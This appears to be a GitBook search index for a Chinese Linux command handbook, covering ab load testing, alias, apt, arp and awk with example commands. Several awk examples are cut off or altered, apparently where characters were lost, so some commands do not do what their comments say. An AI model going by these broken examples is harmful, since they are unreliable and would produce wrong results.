{"./":{"url":"./","title":"Introduction","keywords":"","body":"序言参考联系公众号序言 这是一本关于集合 Linux Comand 的书。 参考 jaywcjlove 的命令搜索 linux 命令菜鸟教程 linuxhint.com 联系 Email: 1zoxun1@gmail.com WeChat: weke59 图 1.1.1：Twitter: cnghostwritten Youtube: BlackSwanGreen Ins: cnghostwritten Bilibili: LoveDeatRobots 公众号 图 1.1.2：爱死亡机器人 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-30 12:35:13 "},"Linux-Command/":{"url":"Linux-Command/","title":"Linux Command","keywords":"","body":"Linux Command 介绍1. 背景2. 什么是Linux 命令？Linux Command 介绍 1. 背景 Linux在桌面上的全球市场份额为 2.68%，但超过 90% 的所有云基础设施和托管服务都在此操作系统中运行。仅出于这个原因，熟悉流行的Linux命令就至关重要。 根据2020 年 StackOverflow 调查，Linux是专业开发人员使用最多的操作系统，市场份额高达 55.9%。这不仅仅是巧合。Linux 是免费和开源的，比它的竞争对手具有更好的安全性，并拥有一个强大的命令行，使开发人员和高级用户更有效。您还可以使用功能强大的包管理器和大量开发工具。 2. 什么是Linux 命令？ Linux 命令是在命令行上运行的程序或实用程序。命令行是接受文本行并将其处理成计算机指令的界面。 大多数Linux命令都有一个帮助页面，我们可以使用 flag 调用它-h。大多数时候，标志是可选的。 图 1.2.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-10 04:37:39 "},"Linux-Command/Linux_Command_ab.html":{"url":"Linux-Command/Linux_Command_ab.html","title":"Linux Command Ab","keywords":"","body":"linux Command ab 网站性能压力测试工具1. 简介2. 原理3. 安装4. 参数5. 性能指标5.1 吞吐率5.2 并发连接数5.3 并发用户数5.4 用户平均请求等待时间5.5 服务器平均请求等待时间6. 实例17. 实例2：测试nginx性能linux Command ab 网站性能压力测试工具 tagsstart 测试 tagsstop 图 1.2.1.1：在这里插入图片描述 1. 简介 网站性能压力测试是服务器网站性能调优过程中必不可缺少的一环。只有让服务器处在高压情况下，才能真正体现出软件、硬件等各种设置不当所暴露出的问题。 性能测试工具目前最常见的有以下几种：ab、http_load、webbench、siege。今天我们专门来介绍ab。 ab是apache自带的压力测试工具。ab非常实用，它不仅可以对apache服务器进行网站访问压力测试，也可以对或其它类型的服务器进行压力测试。比如nginx、tomcat、IIS等。 2. 原理 ab是apachebench命令的缩写。 ab的原理：ab命令会创建多个并发访问线程，模拟多个访问者同时对某一URL地址进行访问。它的测试目标是基于URL的，因此，它既可以用来测试apache的负载压力，也可以测试nginx、lighthttp、tomcat、IIS等其它Web服务器的压力。 ab命令对发出负载的计算机要求很低，它既不会占用很高CPU，也不会占用很多内存。但却会给目标服务器造成巨大的负载，其原理类似CC攻击。自己测试使用也需要注意，否则一次上太多的负载。可能造成目标服务器资源耗完，严重时甚至导致死机。 3. 安装 ab的安装非常简单，如果是源码安装apache的话，那就更简单了。apache安装完毕后ab命令存放在apache安装目录的bin目录下。如下： /usr/local/apache2/bin 如果apache 是通过yum的RPM包方式安装的话，ab命令默认存放在/usr/bin目录下。如下： which ab 注意：如果不想安装apache但是又想使用ab命令的话，我们可以直接安装apache的工具包httpd-tools。如下： yum -y install httpd-tools 查看ab是否安装成功，可以切换到上述目录下，使用ab –V命令进行检测。如下： ab -V 如果ab安装成功，通过ab –V命令则会显示ab的相迎版本，如上图示。 注意以上是在linux平台下进行安装的，如果是windows平台下，我们也可以下载对应的apache版本进行安装。 目前apache最新版2.4.10，apache官网已经没有windows下载的版本。但是我们可以下载apache官网提供的集成软件包，如下： 4. 参数 有关ab命令的使用，我们可以通过帮助命令进行查看。如下： ab --help 下面我们对这些参数，进行相关说明。如下： -n在测试会话中所执行的请求个数。默认时，仅执行一个请求。 -c一次产生的请求个数。默认是一次一个。 -t测试所进行的最大秒数。其内部隐含值是-n 50000，它可以使对服务器的测试限制在一个固定的总时间以内。默认时，没有时间限制。 -p包含了需要POST的数据的文件。 -P对一个中转代理提供BASIC认证信任。用户名和密码由一个:隔开，并以base64编码形式发送。无论服务器是否需要(即, 是否发送了401认证需求代码)，此字符串都会被发送。 -T POST数据所使用的Content-type头信息。 -v设置显示信息的详细程度-4或更大值会显示头信息，3或更大值可以显示响应代码(404,200等),2或更大值可以显示警告和其他信息。 -V显示版本号并退出。 -w以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。 -i执行HEAD请求，而不是GET。 -x设置属性的字符串。 -X对请求使用代理服务器。 -y设置属性的字符串。 -z设置属性的字符串。 -C对请求附加一个Cookie:行。其典型形式是name=value的一个参数对，此参数可以重复。 -H对请求附加额外的头信息。此参数的典型形式是一个有效的头信息行，其中包含了以冒号分隔的字段和值的对(如,\"Accept-Encoding:zip/zop;8bit\")。 -A对服务器提供BASIC认证信任。用户名和密码由一个:隔开，并以base64编码形式发送。无论服务器是否需要(即,是否发送了401认证需求代码)，此字符串都会被发送。 -h显示使用方法。 -d不显示\"percentage served within XX [ms] table\"的消息(为以前的版本提供支持)。 -e产生一个以逗号分隔的(CSV)文件，其中包含了处理每个相应百分比的请求所需要(从1%到100%)的相应百分比的(以微妙为单位)时间。由于这种格式已经“二进制化”，所以比'gnuplot'格式更有用。 -g把所有测试结果写入一个'gnuplot'或者TSV(以Tab分隔的)文件。此文件可以方便地导入到Gnuplot,IDL,Mathematica,Igor甚至Excel中。其中的第一行为标题。 -i执行HEAD请求，而不是GET。 -k启用HTTP KeepAlive功能，即在一个HTTP会话中执行多个请求。默认时，不启用KeepAlive功能。 -q如果处理的请求数大于150，ab每处理大约10%或者100个请求时，会在stderr输出一个进度计数。此-q标记可以抑制这些信息。 5. 性能指标 在进行性能测试过程中有几个指标比较重要： 5.1 吞吐率 服务器并发处理能力的量化描述，单位是reqs/s，指的是在某个并发用户数下单位时间内处理的请求数。某个并发用户数下单位时间内能处理的最大请求数，称之为最大吞吐率（Requests per second）。 记住：吞吐率是基于并发用户数的。这句话代表了两个含义： a、吞吐率和并发用户数相关 b、不同的并发用户数下，吞吐率一般是不同的 计算公式：总请求数/处理完成这些请求数所花费的时间，即 Request per second=Complete requests/Time taken for tests 必须要说明的是，这个数值表示当前机器的整体性能，值越大越好。 5.2 并发连接数 并发连接数（The number of concurrent connections）指的是某个时刻服务器所接受的请求数目，简单的讲，就是一个会话。 5.3 并发用户数 要注意区分这个概念和并发连接数之间的区别，一个用户可能同时会产生多个会话，也即连接数。在HTTP/1.1下，IE7支持两个并发连接，IE8支持6个并发连接，FireFox3支持4个并发连接，所以相应的，我们的并发用户数（Concurrency Level）就得除以这个基数。 5.4 用户平均请求等待时间 计算公式：处理完成所有请求数所花费的时间/（总请求数/并发用户数），即： Time per request=Time taken for tests/（Complete requests/Concurrency Level） 5.5 服务器平均请求等待时间 （Time per request:across all concurrent requests）计算公式：处理完成所有请求数所花费的时间/总请求数，即： Time taken for/testsComplete requests 可以看到，它是吞吐率的倒数。 同时，它也等于用户平均请求等待时间/并发用户数，即 Time per request/Concurrency Level 6. 实例1 ab的命令参数比较多，我们经常使用的是-c和-n参数。 下面我们就实际进行操作下，首先新建一个虚拟主机a.ilanni.com。如下： cat /etc/httpd/conf/httpd.conf|grep -v ^#|grep -v ^$ mkdir -p /www/a.ilanni.com echo ''>/www/a.ilanni.com/index.php cat /www/a.ilanni.com/index.php 虚拟主机新建完毕后，我们来启动apache，并访问虚拟主机a.ilanni.com。如下： wget http://a.ilanni.com 虚拟主机a.ilanni.com创建完毕后，我们现在就来测试apache的性能。使用如下命令： ab -c 10 -n 100 http://a.ilanni.com/index.php -c10表示并发用户数为10 -n100表示请求总数为100 http://a.ilanni.com/index.php表示请求的目标URL 这行表示同时处理100个请求并运行10次index.php文件。 通过上图，测试结果也一目了然，apache测试出的吞吐率为：Requests per second: 204.89[#/sec](mean)。 除此之外还有其他一些信息，需要说明下，如下： Server Software表示被测试的Web服务器软件名称。 Server Hostname表示请求的URL主机名。 Server Port表示被测试的Web服务器软件的监听端口。 Document Path表示请求的URL中的根绝对路径，通过该文件的后缀名，我们一般可以了解该请求的类型。 Document Length表示HTTP响应数据的正文长度。 Concurrency Level表示并发用户数，这是我们设置的参数之一。 Time taken for tests表示所有这些请求被处理完成所花费的总时间。 Complete requests表示总请求数量，这是我们设置的参数之一。 Failed requests表示失败的请求数量，这里的失败是指请求在连接服务器、发送数据等环节发生异常，以及无响应后超时的情况。如果接收到的HTTP响应数据的头信息中含有2XX以外的状态码，则会在测试结果中显示另一个名为“Non-2xx responses”的统计项，用于统计这部分请求数，这些请求并不算在失败的请求中。 Total transferred表示所有请求的响应数据长度总和，包括每个HTTP响应数据的头信息和正文数据的长度。注意这里不包括HTTP请求数据的长度，仅仅为web服务器流向用户PC的应用层数据总长度。 HTML transferred表示所有请求的响应数据中正文数据的总和，也就是减去了Total transferred中HTTP响应数据中的头信息的长度。 Requests per second吞吐率，计算公式：Complete requests/Time taken for tests Time per request用户平均请求等待时间，计算公式：Time token for tests/（Complete requests/Concurrency Level）。 Time per requet(across all concurrent request)服务器平均请求等待时间，计算公式：Time taken for tests/Complete requests，正好是吞吐率的倒数。也可以这么统计：Time per request/Concurrency Level。 Transfer rate表示这些请求在单位时间内从服务器获取的数据长度，计算公式：Total trnasferred/ Time taken for tests，这个统计很好的说明服务器的处理能力达到极限时，其出口宽带的需求量。 Percentage of requests served within a certain time（ms）这部分数据用于描述每个请求处理时间的分布情况，比如以上测试，80%的请求处理时间都不超过6ms，这个处理时间是指前面的Time per request，即对于单个用户而言，平均每个请求的处理时间。 7. 实例2：测试nginx性能 第五步测试了apache的性能，现在我们来测试nginx的性能。 首先配置nginx的虚拟主机，如下： cat /usr/local/nginx/conf/nginx.conf|grep -v ^#|grep -v ^$ 虚拟主机配置完毕后，我们现在访问虚拟主机。如下： wget a.ilanni.com 注意该虚拟主机与apache的虚拟主机是同一个，而且请求的是同一个页面。 使用如同apache同样的命令进行测试nginx，如下： ab -c 10 -n 100 http://a.ilanni.com/index.php 结果如下： 通过上图，测试结果也一目了然，nginx测试出的吞吐率为：Requests per second: 349.14[#/sec](mean)。 对比apache请求该页面的吞吐率，发现nginx吞吐率就是要比apache高。根据前面我们提到的性能指标Requests per second吞吐率越高，服务器性能越好。 这也证明了nginx性能确实比apache性能高。 更多阅读： ab - Apache HTTP server benchmarking tool Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 04:28:07 "},"Linux-Command/Linux_Command_Alias.html":{"url":"Linux-Command/Linux_Command_Alias.html","title":"Linux Command Alias","keywords":"","body":"Linux Command Alias 别名Linux Command Alias 别名 tagsstart 系统设置 tagsstop alias命令别名用法： # save fingers! alias l='ls' # long listing of ls alias ll='ls -l' # colors and file types alias lf='ls -CF' # sort by filename extension alias lx='ls -lXB' # sort by size alias lk='ls -lSr' # show hidden files alias la='ls -A' # sort by date alias lt='ls -ltr' # other aliases # launch webpages from terminal alias bbc='firefox http://www.bbc.co.uk/ &' alias sd='firefox http://slashdot.org/ &' alias www='firefox' # ssh to common destinations by just typing their name # log in to 'declan' alias declan='ssh declan' # log in to work using a non-standard port (222) alias work='ssh work.example.com -p 222' # log in to work and tunnel the internal proxy to localhost:80 alias workweb='ssh work.example.com -p 222 -L 80:proxy.example.com:8080' Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:21:20 "},"Linux-Command/Linux_Command_apt.html":{"url":"Linux-Command/Linux_Command_apt.html","title":"Linux Command Apt","keywords":"","body":"Linux Command apt 软件包管理1. 简介2. apt 示例2.1 apt search2.2 apt show2.3 apt list2.4 apt depends2.5 apt install2.6 apt remove2.7 apt purge2.8 apt update2.9 apt upgrade3. apt-get 参数4. apt-get 示例5. apt-cache 示例6. apt-mark 示例Linux Command apt 软件包管理 tagsstart 软件包管理 tagsstop 图 1.2.3.1：在这里插入图片描述 1. 简介 apt 是一个命令行实用程序，用于在 Ubuntu、Debian 和相关 Linux 发行版上安装、更新、删除和以其他方式管理 deb 包。apt-get它将和工具中最常用的命令apt-cache与某些选项的不同默认值相结合。 图 1.2.3.2：在这里插入图片描述 2. apt 示例 2.1 apt search apt search php 搜索选项可用于搜索给定的正则表达式 apt search mysql-5.? apt search mysql-server-5.? apt search httpd* apt search ^apache apt search ^nginx apt search ^nginx$ 2.2 apt show apt show {pkgNamehere} 要显示或查看有关给定包的信息，包括其依赖项、安装和下载大小、包的可用来源、包内容的描述等等 apt show nginx apt show sudo apt show apt-cache show 显示装细节 2.3 apt list apt list 要列出所有包，请输入： 要显示满足特定条件的包列表 apt list | more apt list | grep foo apt list | grep php7- apt list nginx apt list 'php7*' apt list --installed 列出所有已安装的包 apt list --installed | grep {pkgNameHere} apt list --upgradable 列出已升级的软件包 2.4 apt depends #列出包依赖 apt depends {pkgNameHere} 依赖选项显示一个包具有的每个依赖项的列表以及可以满足该依赖项的所有可能的其他包。 apt depends sudo 2.5 apt install apt install apt-get install 安装软件包 2.6 apt remove apt remove {pkgNameHere} 移除软件包 apt remove nginx 删除或移除一个名为 nginx 的包，除系统上的配置文件外，所有文件都将被删除。 apt autoremove apt-get autoremove 自动删除不需要的包 2.7 apt purge apt purge {pkgNameHere} 移除软件包及配置文件 apt purge nginx nginx-core nginx-common 删除一个包会删除所有打包的数据，但通常会留下小的（修改过的）用户配置文件，以防删除是意外的。 2.8 apt update apt update {pkgNameHere} 刷新存储库索引 2.9 apt upgrade apt upgrade {pkgNameHere} 升级所有可升级的软件包 apt full-upgrade 完整升级 3. apt-get 参数 update - 重新获取软件包列表 upgrade - 进行更新 install - 安装新的软件包 remove - 移除软件包 autoremove - 自动移除全部不使用的软件包 purge - 移除软件包和配置文件 source - 下载源码档案 build-dep - 为源码包配置编译依赖 dist-upgrade - 发行版升级, 参见 apt-get(8) dselect-upgrade - 依照 dselect 的选择更新 clean - 清除下载的归档文件 autoclean - 清除旧的的已下载的归档文件 check - 检验是否有损坏的依赖 选项： -h 本帮助文件。 -q 输出到日志 - 无进展指示 -qq 不输出信息，错误除外 -d 仅下载 - 不安装或解压归档文件 -s 不实际安装。模拟执行命令 -y 假定对所有的询问选是，不提示 -f 尝试修正系统依赖损坏处 -m 如果归档无法定位，尝试继续 -u 同时显示更新软件包的列表 -b 获取源码包后编译 -V 显示详细的版本号 -c=? 阅读此配置文件 -o=? 设置自定的配置选项，如 -o dir::cache=/tmp 4. apt-get 示例 apt-get install packagename 安装包 apt-get install packagename - - reinstall 重新安装包 apt-get -f install 修复安装\"-f = --fix-missing\" apt-get remove packagename 删除包 apt-get remove packagename - - purge 删除包，包括删除配置文件等 apt-get update 更新源 apt-get upgrade 更新已安装的包 apt-get dist-upgrade 升级系统 apt-get dselect-upgrade 使用 dselect 升级 apt-get build-dep packagename 安装相关的编译环境 apt-get source packagename 下载该包的源代码 apt-get clean 清理无用的包 apt-get autoclean 清理无用的包 apt-get check 检查是否有损坏的依赖 5. apt-cache 示例 apt-cache search packagename 搜索包 apt-cache show packagename 获取包的相关信息，如说明、大小、版本等 apt-cache depends packagename 了解使用依赖 apt-cache rdepends packagename 是查看该包被哪些包依赖 apt-cache stats 显示系统安装包的统计信息 apt-cache madison kubeadm 显示安装包的各个版本 apt-cache policy kubeadm 在列表中显示版本 6. apt-mark 示例 apt-mark 用来标记安装软件包的状态. 有时一个软件的仓库出了问题, 用 apt-get 安装后无法使用, 这时就可以利用 apt-mark hold package 标记该软件包不被自动更新 apt-mark hold xxx 屏蔽指定软件包的更新 apt-mark unhold xxx 将 hold 替换为 unhold 就可以取消对这个包版本的锁定 dpkg --get-selections 查看包状态 参考： Using apt Commands in Linux apt Command Examples for Ubuntu/Debian Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-20 16:36:26 "},"Linux-Command/Linux_Command_arp.html":{"url":"Linux-Command/Linux_Command_arp.html","title":"Linux Command Arp","keywords":"","body":"Linux Command arp 地址转换协议1. 简介2. 语法3. 选项4. 实例Linux Command arp 地址转换协议 tagsstart 网络 协议 tagsstop 1. 简介 ARP 是 TCP/IP 协议族中的一个重要协议，用于确定对应 IP 地址的网卡物理地址。 使用 arp 命令，能够查看本地计算机或另一台计算机的 ARP 高速缓存中的当前内容。此外，使用 arp 命令可以人工方式设置静态的网卡物理地址 / IP 地址对，使用这种方式可以为缺省网关和本地服务器等常用主机进行本地静态配置，这有助于减少网络上的信息量。 按照缺省设置，ARP 高速缓存中的项目是动态的，每当向指定地点发送数据并且此时高速缓存中不存在当前项目时，ARP 便会自动添加该项目 2. 语法 arp（选项）（参数） 3. 选项 -a # 主机 ：显示 arp 缓冲区的所有条目； -H # 地址类型 ：指定 arp 指令使用的地址类型； -d # 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目； -D # 使用指定接口的硬件地址； -e # 以 Linux 的显示风格显示 arp 缓冲区中的条目； -i # 接口 ：指定要操作 arp 缓冲区的网络接口； -s # 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射； -n # 以数字方式显示 arp 缓冲区中的条目； -v # 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息； -f # 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。 主机：查询 arp 缓冲区中指定主机的 arp 条目。 4. 实例 显示arp 缓冲区内容 $ arp -v Address HWtype HWaddress Flags Mask Iface 192.168.0.134 ether 00:21:5E:C7:4D:88 C eth1 115.238.144.129 ether 38:22:D6:2F:B2:F1 C eth0 Entries: 2 Skipped: 0 Found: 2 添加静态 arp 映射 arp -s IP MAC-ADDRESS arp -s 192.168.1.1 00:b1:b2:b3:b4:b5 ① arp –a：用于查看高速缓存中的所有项目。 ② arp -a IP：如果有多个网卡，那么使用 arp -a 加上接口的 IP 地址，就可以只显示与该接口相关的 ARP 缓存项目。 ③ arp -s IP 物理地址：向 ARP 高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。 ④ arp -d IP：使用本命令能够人工删除一个静态项目。 参考： TCP/IP协议——ARP详解 ARP详解 arp command in Linux with examples arp(7) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:43:57 "},"Linux-Command/Linux_Command_awk.html":{"url":"Linux-Command/Linux_Command_awk.html","title":"Linux Command Awk","keywords":"","body":"Linux Command awk 文本匹配1. 简介2. 原理3. 命令3.1 awk [选项] '{编辑指令}' 文件3.2 与管道结合3.3 awk [选项] '[条件]{编辑指令}' 文件3.3 awk [选项] ' BEGIN{编辑指令 } {编辑指令} END{编辑指令}' 文件3.4 第n到末尾参数输出3.5 多行合并一行3.6 获取外部变量3.7 内建变量4. 脚本5. 自定义函数6. 数组6.1 创建数组6.2 删除数组元素6.3 多维数组7. split 切割Linux Command awk 文本匹配 tagsstart 文件管理 tagsstop 1. 简介 awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。 awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。 awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。 2. 原理 AWK 工作流程可分为三个部分： 读输入文件之前执行的代码段（由BEGIN关键字标识）。 主循环执行输入文件的代码段。 读输入文件之后的代码段（由END关键字标识）。 命令结构: awk 'BEGIN{ commands } pattern{ commands } END{ commands }' 图 1.2.5.1：在这里插入图片描述 1、通过关键字 BEGIN 执行 BEGIN 块的内容，即 BEGIN 后花括号 {} 的内容。 2、完成 BEGIN 块的执行，开始执行body块。 3、读入有 \\n 换行符分割的记录。 4、将记录按指定的域分隔符划分域，填充域，$0 则表示所有域(即一行内容)，$1 表示第一个域，$n 表示第 n 个域。 5、依次执行各 BODY 块，pattern 部分匹配该行内容成功后，才会执行 awk-commands 的内容。 6、循环读取并执行各行直到文件结束，完成body块执行。 7、开始 END 块执行，END 块可以输出最终结果。 3. 命令 3.1 awk [选项] '{编辑指令}' 文件 awk '{print $1,$2}' /etc/rc.local //输出文件的第1、2列 head -7 /etc/passwd > passwd.txt awk -F \":\" '{print $1\",\"$7}' passwd.txt //以“：”作为分隔符，，打印第1和7列 awk -F [:/] '{print $1,$10}' passwd.txt //以“：”或“/”作为分隔符，，打印第1和10列 awk -F: '{print NR,NF}' passwd.txt // 打印行数与字段数 free | awk '/Mem/{printf(\"RAM Usage: %.2f\\n\"), $3/$2*100}'| awk '{print $3}' 3.2 与管道结合 ifconfig eth0 | grep \"inet\" | awk '{print $2} df -hT / | tail -1 | awk '{print $6}' uname -a | awk '{print $1,$3,$12}' //输出第1、3、12字段 seq 100 | awk 'NR%7==0||NR~/7/{print}' #列出100以内整数中7的倍数或是含7的数 seq 100 | awk '$0%7==0||$0~/7/{print}' 行号与每行的实际文本值是一致的，那么根据NR或者$0行值进行判断都是可以的。输出100以内7的倍数或是包含7的数 3.3 awk [选项] '[条件]{编辑指令}' 文件 awk -F: '/bash$/{print}' passwd.txt #以bash结尾 awk -F: '/^[a-d]/{print $1,$6}' passwd.txt #以a-d任意字符开头的第1和6列字段打印 awk -F: '/^a|nologin$/{print $1,$7}' passwd.txt #以a开头或nologin结尾的第1和7列字段打印 awk -F: '$6~/bin$/{print $1,$6}' passwd.txt #以bin结尾的打印第1和6列 awk -F: '$7!~/nologin$/{print $1,$7}' passwd.txt #输出其中登录Shell不以nologin结尾（对第7个字段做!~反向匹配）的用户名、登录Shell信息 awk -F: 'NR==3{print}' passwd.txt #输出第3行（行号NR等于3）的用户记录 awk -F: 'NR%2==1{print}' passwd.txt #输出奇数行（行号NR除以2余数为1）的用户记录 awk -F: 'NR=5{print}' passwd.txt #输出从第5行开始到文件末尾的所有行 awk -F: '$1==\"sync\"{print}' passwd.txt #输出用户名为“sync”的行 awk -F: '$1==ENVIRON[\"USER\"]{print $1,$6,$7}' passwd.txt #输出当前用户的用户名、宿主目录、登录Shell信息 awk -F: 'NR>=3&&NR=3)&&(NR=501&&$3 3.3 awk [选项] ' BEGIN{编辑指令 } {编辑指令} END{编辑指令}' 文件 #打印A乘于2.56的值 awk 'BEGIN{A=1024;print A*2.56}' #统计系统中使用bash作为登录Shell的用户总个数 awk 'BEGIN{x=0}/\\=500{print $2}' >>ip.log #对第1）步的结果根据访问量排名 awk '{ip[$1]++} END{for(i in ip) {print i,ip[i]}}' /var/log/httpd/access_log | sort -nr -k 2 求最大值： awk 'BEGIN {max = 0} {if ($1+0 > max+0) max=$1} END {print \"Max=\", max}' test.txt Max= 118 求最小值： awk 'BEGIN {min = 65536} {if ($1+0 3.4 第n到末尾参数输出 $ echo \"1 2 3 4 5\" | awk '{for(i=1;i 3.5 多行合并一行 $ cat test MD_Q9_G1_F MD_Q9_G1_Ua MD_Q9_G1_Ub MD_Q9_G1_Uc MD_Q9_G1_Uab MD_Q9_G1_Ubc MD_Q9_G1_Uca MD_Q9_G1_Ia MD_Q9_G1_Ib MD_Q9_G1_Ic MD_Q9_G1_Pa MD_Q9_G1_Pb MD_Q9_G1_Pc MD_Q9_G1_Psum MD_Q9_G1_Qa MD_Q9_G1_Qb MD_Q9_G1_Qc MD_Q9_G1_Qsum MD_Q9_G1_Sa MD_Q9_G1_Sb MD_Q9_G1_Sc MD_Q9_G1_Ssum MD_Q9_G1_PFa MD_Q9_G1_PFb MD_Q9_G1_PFc MD_Q9_G1_PF $ awk '{ORS=NR%50?\",\":RS}1' test MD_Q9_G1_F,MD_Q9_G1_Ua,MD_Q9_G1_Ub,MD_Q9_G1_Uc,MD_Q9_G1_Uab,MD_Q9_G1_Ubc,MD_Q9_G1_Uca,MD_Q9_G1_Ia,MD_Q9_G1_Ib,MD_Q9_G1_Ic,MD_Q9_G1_Pa,MD_Q9_G1_Pb,MD_Q9_G1_Pc,MD_Q9_G1_Psum,MD_Q9_G1_Qa,MD_Q9_G1_Qb,MD_Q9_G1_Qc,MD_Q9_G1_Qsum,MD_Q9_G1_Sa,MD_Q9_G1_Sb,MD_Q9_G1_Sc,MD_Q9_G1_Ssum,MD_Q9_G1_PFa,MD_Q9_G1_PFb,MD_Q9_G1_PFc,MD_Q9_G1_PF, $ awk 'NR%50{printf $0\",\";next}1' test MD_Q9_G1_F,MD_Q9_G1_Ua,MD_Q9_G1_Ub,MD_Q9_G1_Uc,MD_Q9_G1_Uab,MD_Q9_G1_Ubc,MD_Q9_G1_Uca,MD_Q9_G1_Ia,MD_Q9_G1_Ib,MD_Q9_G1_Ic,MD_Q9_G1_Pa,MD_Q9_G1_Pb,MD_Q9_G1_Pc,MD_Q9_G1_Psum,MD_Q9_G1_Qa,MD_Q9_G1_Qb,MD_Q9_G1_Qc,MD_Q9_G1_Qsum,MD_Q9_G1_Sa,MD_Q9_G1_Sb,MD_Q9_G1_Sc,MD_Q9_G1_Ssum,MD_Q9_G1_PFa,MD_Q9_G1_PFb,MD_Q9_G1_PFc,MD_Q9_G1_PF, awk '{OFS=\",\";ORS=NR%50?OFS:RS}1' test MD_Q9_G1_F,MD_Q9_G1_Ua,MD_Q9_G1_Ub,MD_Q9_G1_Uc,MD_Q9_G1_Uab,MD_Q9_G1_Ubc,MD_Q9_G1_Uca,MD_Q9_G1_Ia,MD_Q9_G1_Ib,MD_Q9_G1_Ic,MD_Q9_G1_Pa,MD_Q9_G1_Pb,MD_Q9_G1_Pc,MD_Q9_G1_Psum,MD_Q9_G1_Qa,MD_Q9_G1_Qb,MD_Q9_G1_Qc,MD_Q9_G1_Qsum,MD_Q9_G1_Sa,MD_Q9_G1_Sb,MD_Q9_G1_Sc,MD_Q9_G1_Ssum,MD_Q9_G1_PFa,MD_Q9_G1_PFb,MD_Q9_G1_PFc,MD_Q9_G1_PF, 3.6 获取外部变量 3.6.1 获得普通外部变量 格式： awk '{action}' 变量名=变量值 这样传入变量，可以在action中获得值。 注意：变量名与值放到’{action}’后面。 $ test='awk code' $ echo | awk '{print test}' test=\"$test\" awk code 3.6.2 BEGIN 获取变量 格式： awk –v 变量名=变量值 [–v 变量2=值2 …] 'BEGIN{action}’ 注意：用-v 传入变量可以在3中类型的action 中都可以获得到，但顺序在 action前面。 $ test='awk code' $ echo | awk -v test=\"$test\" 'BEGIN{print test}' awk code $ echo | awk -v test=\"$test\" '{print test}' awk code errnum=$(($errnum+1)) awk -F \" \" -v b=\"$i\" -v d=$errnum '{if ($1==b) $3=d}1{print $0 > \"alert_list\"}' alert_list 3.6.3 获取环境变量 $ awk 'BEGIN{for (i in ENVIRON) {print i\"=\"ENVIRON[i];}}' AWKPATH=.:/usr/share/awk SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass SELINUX_LEVEL_REQUESTED= SELINUX_ROLE_REQUESTED= LANG=en_US.UTF-8 ....... 只需要调用： awk内置变量 ENVIRON,就可以直接获得环境变量。它是一个字典数组。环境变量名 就是它的键值。 3.7 内建变量 包含：FS,NF,NR,RT,RS,ORS,OFS 3.7.1 FS 指定字段un列分隔符（Font Space） $ echo \"111|222|333\" | awk '{print $1}' 111|222|333 $ echo \"111|222|333\" | awk 'BEGIN{FS=\"|\"}{print $1}' 111 3.7.2 OFS 指定输出字段列分隔符（Output Font space） $ echo \"111 222 333\" |awk 'BEGIN{OFS=\"|\";}{print $1,$2,$3}' 111|222|333 3.7.3 RS 指定行分隔符 默认分隔符为\\n（Row Space） $ echo \"111 222|333 444|555 666\" | awk 'BEGIN{RS=\"|\"}{print $0}' 111 222 333 444 555 666 3.7.4 ORS 指定输出行分隔符 $ awk 'BEGIN{ORS=\"|\";}{print $0;}' test.txt 111 222|333 444|555 666 3.7.5 RT 代指分隔符 $ echo \"111 222|333 444|555 666\" | awk 'BEGIN{RS=\"|\"}{print $0,RT}' 111 222 | 333 444 | 555 666 | 3.7.6 NF 每行字段总数(Number of Font) $ cat test.txt 111 222 333 444 555 666 $ awk '{print NF}' test.txt 2 2 2 $ awk '{print $NF}' test.txt 222 444 666 3.7.7 NR 当前行数(Number of Row) $ cat test.txt 111 222 333 444 555 666 777 $ awk '{print NR}' test.txt 1 2 3 $ awk '{print $NR}' test.txt 111 444 777 4. 脚本 关于awk脚本，我们需要注意两个关键词BEGIN和END。 BEGIN{ 这里面放的是执行前的语句 } END {这里面放的是处理完所有的行后要执行的语句 } {这里面放的是处理每一行时要执行的语句} 假设有这么一个文件（学生成绩表）： $ cat score.txt Marry 2143 78 84 77 Jack 2321 66 78 45 Tom 2122 48 77 71 Mike 2537 87 97 95 Bob 2415 40 57 62 $ cat cal.awk #!/bin/awk -f #运行前 BEGIN { math = 0 english = 0 computer = 0 printf \"NAME NO. MATH ENGLISH COMPUTER TOTAL\\n\" printf \"---------------------------------------------\\n\" } #运行中 { math+=$3 english+=$4 computer+=$5 printf \"%-6s %-6s %4d %8d %8d %8d\\n\", $1, $2, $3,$4,$5, $3+$4+$5 } #运行后 END { printf \"---------------------------------------------\\n\" printf \" TOTAL:%10d %8d %8d \\n\", math, english, computer printf \"AVERAGE:%10.2f %8.2f %8.2f\\n\", math/NR, english/NR, computer/NR } 我们来看一下执行结果： $ awk -f cal.awk score.txt NAME NO. MATH ENGLISH COMPUTER TOTAL --------------------------------------------- Marry 2143 78 84 77 239 Jack 2321 66 78 45 189 Tom 2122 48 77 71 196 Mike 2537 87 97 95 